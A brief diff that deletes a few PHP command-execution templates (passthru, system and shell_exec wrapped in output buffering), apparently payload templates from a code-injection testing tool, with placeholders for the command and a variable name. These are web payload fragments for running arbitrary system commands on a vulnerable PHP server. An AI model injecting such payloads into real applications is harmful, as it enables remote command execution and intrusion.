@@ -1,8 +1,0 @@
-Passthru
-ob_start();passthru('{{cmd}}');${{letter}}=ob_get_contents();ob_end_clean();
-
-System
-ob_start();system('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();
-
-
-${{letter}}=shell_exec('{{cmd}}');
